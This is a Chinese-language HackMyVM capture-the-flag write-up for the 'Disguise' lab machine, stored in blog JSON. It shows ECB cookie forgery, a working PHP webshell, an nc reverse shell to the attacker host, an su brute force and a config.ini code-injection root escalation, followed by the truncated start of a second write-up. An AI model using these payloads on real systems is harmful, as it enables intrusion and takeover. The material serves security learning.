Base64\u89e3\u7801\u540e\u8fdb\u884cxxd\u67e5\u770b\uff1a\n\n   ```bash\n   \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n   \u2514\u2500$ echo '+1+3/NxCLcIR0Jq9qDudF8JwkfrsOdSxW16pbszGJLY=' | base64 -d | xxd\n   00000000: fb5f b7fc dc42 2dc2 11d0 9abd a83b 9d17  ._...B-......;..\n   00000010: c270 91fa ec39 d4b1 5b5e a96e ccc6 24b6  .p...9..[^.n..$.\n   ```\n\n6. \u53d6\u7b2c\u4e00\u4e2a16\u5b57\u8282\u7684\u5bc6\u6587 `fb5f b7fc dc42 2dc2 11d0 9abd a83b 9d17`\u3002\n\n7. \u5c06\u6b6416\u5b57\u8282\u5bc6\u6587\u8fdb\u884cBase64\u7f16\u7801\uff1a\n\n   ```bash\n   \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n   \u2514\u2500$ echo '+1+3/NxCLcIR0Jq9qDudF8JwkfrsOdSxW16pbszGJLY=' | base64 -d | head -c 16 | base64\n   +1+3/NxCLcIR0Jq9qDudFw==\n   ```\n\n8. \u5c06\u5f97\u5230\u7684Base64\u7f16\u7801\u540e\u7684\u5b57\u7b26\u4e32 `%2B1%2B3%2FNxCLcIR0Jq9qDudFw%3D%3D` (\u6ce8\u610fURL\u7f16\u7801) \u8bbe\u7f6e\u4e3a `dark_session` Cookie\u7684\u503c\u3002\n\n9. \u8bbf\u95ee `http://dark.disguise.hmv/profile.php`\uff0c\u6210\u529f\u4ee5 `simpleAdmin` \u7528\u6237\u8eab\u4efd\u767b\u5f55\u3002\n   ![image-20250516163748655](https://7r1umphk.github.io/image/20250516163749012.webp)\n   \u8fd9\u6ce2\u64cd\u4f5c\uff0c\u6765\u4e4b\u4e0d\u6613\u554a\uff01\n\n# \u516d\u3001\u83b7\u53d6WebShell\n\n\u4ee5`simpleAdmin`\u8eab\u4efd\u767b\u5f55\u540e\uff0c\u8fdb\u5165\u540e\u53f0\u7ba1\u7406\u9875\u9762 (`/manager/index.php`)\uff0c\u53d1\u73b0\u6709\u6dfb\u52a0\u5546\u54c1\u7684\u529f\u80fd\uff0c\u5e76\u4e14\u53ef\u4ee5\u4e0a\u4f20\u5546\u54c1\u56fe\u7247\u3002\u5148\u4e0a\u4f20\u4e86\u4e00\u4e2a`reverse.php`\n![image-20250516164155309](https://7r1umphk.github.io/image/20250516164155596.webp)\n\n\u5230\u9996\u9875\u67e5\u770b\u6e90\u7801\uff0c\u8fdb\u5165\u56fe\u7247\u7f51\u5740\u53d1\u73b0\u8fd9\u4e2a\u65b9\u5f0f\u8fdb\u5165\u7684\u4e0d\u89e3\u6790php\n\n\u4f7f\u7528`gobuster`\u5bf9 `dark.disguise.hmv` \u7ad9\u70b9\u8fdb\u884c\u76ee\u5f55\u626b\u63cf\uff0c\u786e\u8ba4\u56fe\u7247\u4e0a\u4f20\u8def\u5f84\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ gobuster dir -u http://dark.disguise.hmv -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,md,html,zip\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://dark.disguise.hmv\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              txt,md,html,zip,php\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.html                (Status: 403) [Size: 282]\n/.php                 (Status: 403) [Size: 282]\n/images               (Status: 301) [Size: 323] [--> http://dark.disguise.hmv/images/]\n/index.php            (Status: 200) [Size: 1020]\n/login.php            (Status: 200) [Size: 1134]\n# ... (\u90e8\u5206\u8f93\u51fa) ...\n/captcha.php          (Status: 200) [Size: 370]\n^C\n[!] Keyboard interrupt detected, terminating.\nProgress: 20066 / 1323360 (1.52%)\n===============================================================\nFinished\n===============================================================\n```\n\n\u53d1\u73b0 `/images/` \u76ee\u5f55\u3002\u4f46\u662f\u662f301\u72b6\u6001\uff0c\u5c1d\u8bd5\u5728`/images/`\u8bbf\u95ee`reverse.php`\u663e\u793a404,\u670d\u52a1\u5668\u5bf9\u6587\u4ef6\u540d\u505a\u4e86\u5904\u7406\uff08MD5\u6216\u8005\u5176\u4ed6\u54c8\u5e0c\uff09\n\u91cd\u65b0\u4e0a\u4f20\u4e00\u4e2a\u7b80\u5355\u7684PHP\u4e00\u53e5\u8bdd\u6728\u9a6c\uff0c\u5185\u5bb9\u4e3a\uff1a\n\n```php\n<?php\nif (isset($_REQUEST['cmd'])) {\n    $command = $_REQUEST['cmd'];\n    echo '<pre>'; // For better formatting of command output\n\n    // Execute the command\n    // Using passthru for direct output, or system/exec if preferred\n    passthru($command, $return_var);\n    // Alternatively:\n    // $output = shell_exec($command);\n    // echo htmlentities($output);\n\n    echo '</pre>';\n} else {\n    echo '<html><head><title>PHP CMD Exec</title></head><body>';\n    echo '<form method='GET'>';\n    echo 'Enter command: <input type='text' name='cmd' autofocus>';\n    echo '<input type='submit' value='Execute'>';\n    echo '</form>';\n    echo '<p>Example: ?cmd=ls -la OR ?cmd=whoami</p>';\n    echo '</body></html>';\n}\n?>\n```\n\n\u4e0a\u4f20\u65f6\uff0c\u7ed9\u6587\u4ef6\u540d\u52a0\u4e86\u4e00\u4e2a`'`\u6210\u529f\u62a5\u9519\u62ff\u5230\u4e86\u771f\u5b9e\u6587\u4ef6\u540d\u3002\n![image-20250516165009887](https://7r1umphk.github.io/image/20250516165010255.webp)\n\u8bbf\u95ee `http://dark.disguise.hmv/images/8d755f95e5203d7d71d93aefa9649514.php?cmd=id`\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ curl http://dark.disguise.hmv/images/8d755f95e5203d7d71d93aefa9649514.php?cmd=id\n<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)\n</pre>\n```\n\n\u547d\u4ee4\u6210\u529f\u6267\u884c\uff0c\u5f53\u524d\u7528\u6237\u4e3a `www-data`\u3002\n\n# \u4e03\u3001\u6743\u9650\u63d0\u5347\n\n## 7.1 \u83b7\u53d6\u53cd\u5f39Shell\n\n\u5229\u7528\u5df2\u4e0a\u4f20\u7684Webshell\u83b7\u53d6\u4e00\u4e2a\u53cd\u5f39Shell\uff0c\u4ee5\u4fbf\u8fdb\u884c\u66f4\u65b9\u4fbf\u7684\u64cd\u4f5c\u3002\n\u5728Kali\u4e0a\u8bbe\u7f6e\u76d1\u542c\uff1a\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/shell]\n\u2514\u2500$ nc -lvnp 8888\nlistening on [any] 8888 ...\n```\n\n\u901a\u8fc7Webshell\u6267\u884c\u53cd\u5f39\u547d\u4ee4\uff1a\n`http://dark.disguise.hmv/images/8d755f95e5203d7d71d93aefa9649514.php?cmd=nc+192.168.205.206+8888+-e+/bin/bash`\n\n![image-20250516165136706](https://7r1umphk.github.io/image/20250516165136907.webp)\n\n\u6210\u529f\u63a5\u6536\u5230\u53cd\u5f39Shell\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/shell]\n\u2514\u2500$ nc -lvnp 8888\nlistening on [any] 8888 ...\nconnect to [192.168.205.206] from (UNKNOWN) [192.168.205.211] 51496\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\n\u5bf9Shell\u8fdb\u884cTTY\u4f18\u5316\uff1a\n\n```bash\nscript /dev/null -c bash\n# \u6309 Ctrl+Z \u5c06\u5176\u7f6e\u4e8e\u540e\u53f0\nstty raw -echo; fg\nreset xterm\nexport TERM=xterm\nexport SHELL=/bin/bash\nstty rows 24 columns 80\n```\n\n## 7.2 \u4fe1\u606f\u6536\u96c6 (www-data \u7528\u6237)\n\n\u5728 `/var/www/dark/` \u76ee\u5f55\u4e0b\u627e\u5230 `config.php`\u3002\n\n```bash\nwww-data@disguise:/var/www/dark$ cat config.php\n<?php\n\n$DB_USER = 'dark_db_admin';\n$DB_PASS = 'Str0ngPassw0d1***';\n$DB_NAME = 'dark_shop';\n\n?>\n```\n\n\u62ff\u5230\u6570\u636e\u5e93\u7528\u6237\u540d `dark_db_admin` \u548c\u5bc6\u7801 `Str0ngPassw0d1***`\u3002\n\u767b\u5f55\u6570\u636e\u5e93\u67e5\u770b\u7528\u6237\u4fe1\u606f\u3002\n\n```bash\nwww-data@disguise:/var/www/dark$ mysql -u dark_db_admin -p\nEnter password:\nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection id is 78045\nServer version: 10.3.39-MariaDB-0+deb10u2 Debian 10\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nMariaDB [(none)]> show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| dark_shop          |\n| information_schema |\n+--------------------+\n2 rows in set (0.014 sec)\n\nMariaDB [(none)]> use dark_shop;\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nDatabase changed\nMariaDB [dark_shop]> show tables;\n+---------------------+\n| Tables_in_dark_shop |\n+---------------------+\n| products            |\n| users               |\n+---------------------+\n2 rows in set (0.000 sec)\n\nMariaDB [dark_shop]> select * from users;\n+----+------------------------------------------+--------------------------+---------+---------------------+\n| id | username                                 | password                 | isAdmin | created_at          |\n+----+------------------------------------------+--------------------------+---------+---------------------+\n|  1 | simpleAdmin                              | U3RyMG5nUGFzc3cwZDFAQEA= |       1 | 2025-04-01 04:33:22 |\n# ... \u5176\u4ed6\u7528\u6237 ...\n+----+------------------------------------------+--------------------------+---------+---------------------+\n13 rows in set (0.001 sec)\n```\n\n`simpleAdmin` \u7684\u5bc6\u7801\u54c8\u5e0c\u662f `U3RyMG5nUGFzc3cwZDFAQEA=`\uff0cBase64\u89e3\u7801\u540e\u662f `Str0ngPassw0d1***`\u3002\n\n\u67e5\u770b `/home/` \u76ee\u5f55\uff0c\u53d1\u73b0\u7528\u6237 `darksoul`\u3002\n\n```bash\nwww-data@disguise:/var/www/dark$ ls -la /home/\ntotal 12\ndrwxr-xr-x  3 root     root     4096 Mar 31 11:19 .\ndrwxr-xr-x 18 root     root     4096 Mar 31 11:13 ..\ndrwxr-xr-x  4 darksoul darksoul 4096 Apr  2 04:19 darksoul\n```\n\n\u5c1d\u8bd5\u7528 `Str0ngPassw0d1***` \u5207\u6362\u5230 `darksoul`\uff0c\u5931\u8d25\u3002\n\u5728 `/home/darksoul/` \u76ee\u5f55\u4e0b\u53d1\u73b0 `config.ini`\uff0c\u5185\u5bb9\u548c `/var/www/dark/config.php` \u4e2d\u7684\u6570\u636e\u5e93\u5bc6\u7801\u4e00\u81f4\u3002\n\n```bash\nwww-data@disguise:/home/darksoul$ cat config.ini\n[client]\nuser = dark_db_admin\npassword = Str0ngPassw0d1***\nhost = localhost\ndatabase = dark_shop\nport = int(3306)\n```\n\n\u770b\u6765 `darksoul` \u7684\u5bc6\u7801\u9700\u8981\u7206\u7834\u3002\u5bc6\u7801\u683c\u5f0f\u53ef\u80fd\u662f `Str0ngPassw0d1` + \u4e09\u4e2a\u7279\u6b8a\u5b57\u7b26\u3002\n\u4e0a\u4f20\u4e00\u4e2asu\u7206\u7834\u811a\u672c `suForce` \u548c\u5bc6\u7801\u5b57\u5178 `pass` \u5230 `/tmp/`\u3002\n\u5b57\u5178 `pass` \u751f\u6210\u65b9\u6cd5\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ crunch 3 3 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789?!@#$%^&*()' \\ | sed 's/^/Str0ngPassw0d1/' > pass\nCrunch will now generate the following amount of data: 1556068 bytes\n1 MB\n0 GB\n0 TB\n0 PB\nCrunch will now generate the following number of lines: 389017\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cat pass | wc -l                                                               389017\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ tac pass | sponge pass\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cat pass | wc -l\n389017\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ head -n 10 pass\nStr0ngPassw0d1)))\nStr0ngPassw0d1))(\nStr0ngPassw0d1))*\nStr0ngPassw0d1))&\nStr0ngPassw0d1))^\nStr0ngPassw0d1))%\nStr0ngPassw0d1))$\nStr0ngPassw0d1))#\nStr0ngPassw0d1))@\nStr0ngPassw0d1))!\n```\n\n```bash\nwww-data@disguise:/tmp$ wget 192.168.205.206/suForce\nwww-data@disguise:/tmp$ wget 192.168.205.206/pass\nwww-data@disguise:/tmp$ chmod +x suForce\nwww-data@disguise:/tmp$ ./suForce -u darksoul -w pass\n            _____\n ___ _   _ |  ___|__  _ __ ___ ___\n/ __| | | || |_ / _ \\| '__/ __/ _ \\\n\\__ \\ |_| ||  _| (_) | | | (_|  __/\n|___/\\__,_||_|  \\___/|_|  \\___\\___|\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n code: d4t4s3c     version: v1.0.0\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\ud83c\udfaf Username | darksoul\n\ud83d\udcd6 Wordlist | pass\n\ud83d\udd0e Status   | 54031/389017/13%/Str0ngPassw0d1??? \n\ud83d\udca5 Password | Str0ngPassw0d1???                \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n```\n\n\u7206\u7834\u6210\u529f\uff0c`darksoul` \u7684\u5bc6\u7801\u662f `Str0ngPassw0d1???`\n\u5207\u6362\u7528\u6237\u3002\n\n```bash\nwww-data@disguise:/tmp$ su darksoul\nPassword:\ndarksoul@disguise:/tmp$ id\nuid=1000(darksoul) gid=1000(darksoul) groups=1000(darksoul)\n```\n\n\u6210\u529f\u5207\u6362\u5230 `darksoul`\u3002\u67e5\u770b `user.txt`\u3002\n\n```bash\ndarksoul@disguise:~$ ls -la\ntotal 40\ndrwxr-xr-x 4 darksoul darksoul 4096 Apr  2 04:19 .\ndrwxr-xr-x 3 root     root     4096 Mar 31 11:19 ..\nlrwxrwxrwx 1 root     root        9 Apr  2 00:16 .bash_history -> /dev/null\n-rw-r--r-- 1 darksoul darksoul  220 Mar 31 11:19 .bash_logout\n-rw-r--r-- 1 darksoul darksoul 3526 Mar 31 11:19 .bashrc\n-rw-r--r-- 1 root     root      114 Apr  2 04:03 config.ini\n-rw-r--r-- 1 root     root       32 May 16 06:44 darkshopcount\ndrwx------ 3 darksoul darksoul 4096 Apr  1 10:03 .gnupg\ndrwxr-xr-x 3 darksoul darksoul 4096 Apr  1 10:04 .local\n-rw-r--r-- 1 darksoul darksoul  807 Mar 31 11:19 .profile\n-rw------- 1 darksoul darksoul   68 Apr  2 04:22 user.txt\ndarksoul@disguise:~$ cat user.txt\nGood good study & Day day up,but where is the flag?\ndarksoul@disguise:~$ grep -r -i 'HMV{' / 2>/dev/null\n/home/darksoul/user.txt:hmv{hiddenflag}\n^C\n```\n\n\u8fd9\u91cc\u6709\u4e2aflag `hmv{hiddenflag}`\u3002\n\u7528`xxd`\u4e5f\u80fd\u770b\u5230\u3002\n\n```bash\ndarksoul@disguise:~$ xxd user.txt\n00000000: 476f 6f64 2067 6f6f 6420 7374 7564 7920  Good good study\n00000010: 2620 4461 7920 6461 7920 7570 2c62 7574  & Day day up,but\n00000020: 2077 6865 7265 2069 7320 7468 6520 666c   where is the fl\n00000030: 6167 3f0a 686d 767b 6869 6464 656e 666c  ag?.hmv{hiddenfl\n00000040: 6167 7d0d                                ag}.\n```\n\n\u83b7\u53d6\u7b2c\u4e00\u4e2aflag: `hmv{hiddenflag}`\u3002\n\n## 7.3 darksoul -> root \u63d0\u6743\n\n\u4f7f\u7528`pspy64`\u76d1\u63a7\u8fdb\u7a0b\u3002\n\n```bash\ndarksoul@disguise:/tmp$ wget 192.168.205.206/pspy64\ndarksoul@disguise:/tmp$ chmod +x pspy64\ndarksoul@disguise:/tmp$ ./pspy64\n# ... (pspy64 \u8f93\u51fa) ...\n2025/05/16 06:51:01 CMD: UID=0     PID=16089  | /bin/sh -c /usr/bin/python3 /opt/query.py /home/darksoul/config.ini > /home/darksoul/darkshopcount\n2025/05/16 06:51:02 CMD: UID=0     PID=16090  | /usr/bin/python3 /opt/query.py /home/darksoul/config.ini\n# ... (pspy64 \u8f93\u51fa) ...\n```\n\n\u53d1\u73b0\u4e00\u4e2aroot\u6743\u9650\u7684cron\u5b9a\u65f6\u4efb\u52a1\uff0c\u6bcf\u4e00\u5206\u949f\u6267\u884c `/usr/bin/python3 /opt/query.py /home/darksoul/config.ini`\u3002\n\u67e5\u770b `/opt/query.py` \u6e90\u7801\uff1a\n\n```python\nimport mysql.connector\nimport sys\n\ndef main():\n    if len(sys.argv) != 2:\n        print('Usage: python query.py <configfile>')\n        sys.exit(1)\n\n    cnf = sys.argv[1]\n\n    try:\n        conn = mysql.connector.connect(read_default_file=cnf) # \u5173\u952e\u70b9\n        cursor = conn.cursor()\n\n        query = 'SELECT COUNT(*) FROM users'\n        cursor.execute(query)\n        results = cursor.fetchall()\n        print(f'users count:{results[0][0]}')\n\n        query = 'SELECT COUNT(*) FROM products'\n        cursor.execute(query)\n        results = cursor.fetchall()\n        print(f'products count:{results[0][0]}')\n    except mysql.connector.Error as err:\n        print(f'db connect error: {err}')\n    finally:\n        if 'cursor' in locals():\n            cursor.close()\n        if 'conn' in locals() and conn.is_connected():\n            conn.close()\n\nif __name__ == '__main__':\n    main()\n```\n\n\u811a\u672c\u4f7f\u7528\u4e86 `mysql.connector.connect(read_default_file=cnf)`\uff0c\u5176\u4e2d`cnf`\u662f `/home/darksoul/config.ini`\u3002\n\u68c0\u67e5 `config.ini` \u7684\u6743\u9650\u3002\n\n```bash\ndarksoul@disguise:~$ ls -la config.ini\n-rw-r--r-- 1 root root 114 Apr  2 04:03 config.ini\n```\n\n\u539f `config.ini` \u662froot\u6240\u6709\uff0cdarksoul\u4e0d\u53ef\u5199\u3002\u4f46\u662fdarksoul\u53ef\u4ee5\u5220\u9664\uff08\u56e0\u4e3a\u7236\u76ee\u5f55`/home/darksoul`\u662fdarksoul\u53ef\u5199\u7684\uff09\uff0c\u7136\u540e\u521b\u5efa\u4e00\u4e2a\u540c\u540d\u6587\u4ef6\u3002\n\n\u6211\u5f53\u65f6\u662f\u628a\u539f\u6765\u7684 `config.ini` \u5907\u4efd\u6210\u4e86 `config.ini.bak`\uff0c\u7136\u540e\u65b0\u5efa\u4e86\u4e00\u4e2a `config.ini`\u3002\n\n```bash\ndarksoul@disguise:~$ mv config.ini config.ini.bak # \u5982\u679c\u9700\u8981\u5907\u4efd\ndarksoul@disguise:~$ touch config.ini\ndarksoul@disguise:~$ ls -la config.ini\n-rw-r--r-- 1 darksoul darksoul 0 May 16 06:57 config.ini\n```\n\n\u67e5\u4e86\u4e00\u4e0b `mysql-connector-python` \u7684 `exploit`\uff0cgoogle\u627e\u4e0d\u5230\uff0c[[wx\u516c\u4f17\u53f7](https://mp.weixin.qq.com/s/h3qOUrzhANfDJ0PuAJyc6w)](https://mp.weixin.qq.com/s/h3qOUrzhANfDJ0PuAJyc6w)\u627e\u5230\u4e86\u3002\u4fe1\u606f\u6536\u96c6\u7684\u7ec8\u70b9\u662fwx\u516c\u4f17\u53f7\uff08\u6ed1\u7a3d\uff09\u3002\n![image-20250516191958461](https://7r1umphk.github.io/image/20250516191958785.webp)\n\n\u6784\u9020\u6076\u610f\u7684 `config.ini`\uff1a\n\n```ini\n[client]\nuser = dark_db_admin\npassword = Str0ngPassw0d1***\nhost = localhost\ndatabase = dark_shop\nport = int(3306)\nallow_local_infile=__import__('os').system('chmod u+s /bin/bash')\n```\n\n\u8fd9\u4e2a `allow_local_infile` \u914d\u7f6e\u9879\uff08\u6216\u5176\u4ed6\u53ef\u5229\u7528\u7684\u914d\u7f6e\u9879\uff09\u4f1a\u88ab `mysql.connector.connect` \u89e3\u6790\u5e76\u6267\u884c\u540e\u9762\u7684Python\u4ee3\u7801\uff0c\u4ece\u800c\u7ed9 `/bin/bash` \u52a0\u4e0aSUID\u6743\u9650\u3002\n\n\u7b49\u5f85cron\u4efb\u52a1\u6267\u884c (\u6700\u591a1\u5206\u949f)\u3002\u53ef\u4ee5\u7528 `pspy64` \u76d1\u63a7\u3002\n\n```bash\n# pspy64 \u8f93\u51fa\u4e2d\u4f1a\u770b\u5230\n2025/05/16 07:19:01 CMD: UID=0     PID=16589  | sh -c chmod u+s /bin/bash\n```\n\n\u68c0\u67e5 `/bin/bash` \u6743\u9650\u3002\n\n```bash\ndarksoul@disguise:~$ ls -la /bin/bash\n-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash\n```\n\n\u6210\u529f\u52a0\u4e0aSUID\u6743\u9650\uff01\u6267\u884c `bash -p` \u83b7\u53d6root\u6743\u9650\u3002\n\n```bash\ndarksoul@disguise:~$ bash -p\nbash-5.0# id\nuid=1000(darksoul) gid=1000(darksoul) euid=0(root) groups=1000(darksoul)\nbash-5.0# cat /root/root.txt\n#Congratulations!!!\nhmv{CVE-2025-21548}\n```\n\n\u6210\u529f\u83b7\u53d6root\u6743\u9650\u5e76\u8bfb\u53d6 `/root/root.txt` \u4e2d\u7684flag: `hmv{CVE-2025-21548}`\u3002\n\n# \u516b\u3001\u603b\u7ed3\n\n\u672c\u6b21Disguise\u9776\u673a\u7684\u6e17\u900f\u8fc7\u7a0b\u6d89\u53ca\u4e86Web\u5e94\u7528\u5c42\u9762\u7684\u4fe1\u606f\u6536\u96c6\u3001\u6f0f\u6d1e\u626b\u63cf\u3001\u5b50\u57df\u540d\u7206\u7834\uff0c\u4ee5\u53ca\u9488\u5bf9ECB\u52a0\u5bc6\u6a21\u5f0f\u4e0bCookie\u7684\u5de7\u5999\u4f2a\u9020\u3002\u540e\u7eed\u901a\u8fc7\u5bf9\u7cfb\u7edf\u5185\u90e8\u6587\u4ef6\u548c\u8fdb\u7a0b\u7684\u5206\u6790\uff0c\u53d1\u73b0\u4e86\u6570\u636e\u5e93\u51ed\u8bc1\u6cc4\u9732\u548ccron\u5b9a\u65f6\u4efb\u52a1\u7684\u914d\u7f6e\u4e0d\u5f53\uff0c\u6700\u7ec8\u7ed3\u5408Python\u5e93\u7684\u7279\u6027\u5b9e\u73b0\u4e86\u6743\u9650\u63d0\u5347\u81f3root\u3002\u6574\u4e2a\u8fc7\u7a0b\u73af\u73af\u76f8\u6263\uff0c\u5145\u5206\u5c55\u73b0\u4e86\u4fe1\u606f\u6536\u96c6\u548c\u6f0f\u6d1e\u5229\u7528\u7684\u91cd\u8981\u6027\u3002sentence", "top": 0, "createdAt": 1751016536, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P28": {"htmlDir": "docs/post/hmv_Sabulaji.html", "labels": ["HackMyVM"], "postTitle": "hmv_Sabulaji", "postUrl": "post/hmv_Sabulaji.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/28", "commentNum": 0, "wordCount": 17460, "description": "\u5bb3\uff0c\u8fd9\u9776\u673a\uff0c\u7ed9\u6211\u5e72\u6c89\u9ed8\u4e86\n\n\u5148\u63a2\u6d4bip\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ sudo arp-scan -l            \n[sudo] password for kali: \nInterface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.205.1   00:50:56:c0:00:08       VMware, Inc.\n192.168.205.2   00:50:56:f8:ba:aa       VMware, Inc.\n192.168.205.136 08:00:27:05:77:df       PCS Systemtechnik GmbH\n192.168.205.254 00:50:56:f3:0c:de       VMware, Inc.\n\n5 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.966 seconds (130.21 hosts/sec). 4 responded\n          \n```\n\n\u63a2\u6d4b\u670d\u52a1\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ nmap -p- 192.168.205.136\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 20:39 EDT\nNmap scan report for 192.168.205.136\nHost is up (0.00012s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT    STATE SERVICE\n22/tcp  open  ssh\n80/tcp  open  http\n873/tcp open  rsync\nMAC Address: 08:00:27:05:77:DF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.20 seconds\n                                                                            \n```\n\nhttps://book.hacktricks.wiki/zh/network-services-pentesting/873-pentesting-rsync.html#873---pentesting-rsync\n\u611f\u5174\u8da3\u7684\u81ea\u5df1\u53bb\u770b\uff0c\u5927\u6982\u529f\u80fd\u662f\n\n![image-20250612085331462](https://7r1umphk.github.io/image/20250612085338904.webp)\n\n\u67e5\u770b\u4e00\u4e0b\u5171\u4eab\u76ee\u5f55\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ rsync rsync://192.168.205.136:873\n\npublic          Public Files\nepages          Secret Documents\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ rsync rsync://192.168.205.136:873/public/\n\ndrwxr-xr-x          4,096 2025/05/15 12:35:39 .\n-rw-r--r--            433 2025/05/15 12:35:39 todo.list\n                                                                       \n```\n\n\u62c9\u4e0b\u6765\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ mkdir tmp\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ rsync -avz rsync://192.168.205.136:873/public/ ./tmp/public/\n\nreceiving incremental file list\ncreated directory ./tmp/public\n./\ntodo.list\n\nsent 46 bytes  received 380 bytes  852.00 bytes/sec\ntotal size is 433  speedup is 1.02\n                                                            \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/tmp/public]\n\u2514\u2500$ cat todo.list | trans -b :zh 2>/dev/null\n\u5f85\u529e\u4e8b\u9879\u5217\u8868\n==========\n\n1\u3002Sabulaji\uff1a\u5220\u9664\u79c1\u4eba\u5171\u4eab\u8bbe\u7f6e\n - \u67e5\u770b\u6240\u6709\u5171\u4eab\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u3002\n - \u7981\u7528\u4efb\u4f55\u79c1\u4eba\u5171\u4eab\u94fe\u63a5\u6216\u6743\u9650\u3002\n\n2\u3002Sabulaji\uff1a\u66f4\u6539\u4e3a\u5f3a\u5bc6\u7801\n - \u521b\u5efa\u4e00\u4e2a\u65b0\u5bc6\u7801\uff08\u81f3\u5c1112\u4e2a\u5b57\u7b26\uff0c\u5305\u62ec\u5927\u5199\uff0c\u5c0f\u5199\uff0c\u6570\u5b57\u548c\u7b26\u53f7\uff09\u3002\n - \u66f4\u65b0\u7cfb\u7edf\u8bbe\u7f6e\u4e2d\u7684\u5bc6\u7801\u3002\n - \u786e\u4fdd\u4e0d\u4ece\u5176\u4ed6\u5e10\u6237\u91cd\u590d\u4f7f\u7528\u65b0\u5bc6\u7801\u3002\n==========\n      \n```\n\n\u63d0\u793a\u6211\u4eecsabulaji\u662f\u5f31\u5bc6\u7801\uff0c\u6211\u7206\u7834\u4e86ssh\u65e0\u679c\uff0c\u90a3\u5c31\u7ee7\u7eed\u770b\u5171\u4eab\u76ee\u5f55\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/tmp/public]\n\u2514\u2500$ rsync -avz rsync://192.168.205.136:873/epages/ ./tmp/epages/\n\nPassword: \n@ERROR: auth failed on module epages\nrsync error: error starting client-server protocol (code 5) at main.c(1850) [Receiver=3.4.1]\n                      \n```\n\n\u8981\u5bc6\u7801\uff0c\u627eai\u5199\u4e2a\u811a\u672c\u7206\u7834\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cat bprsync.py \n#!/usr/bin/env python3\nimport subprocess\nimport os\nimport sys\nfrom multiprocessing 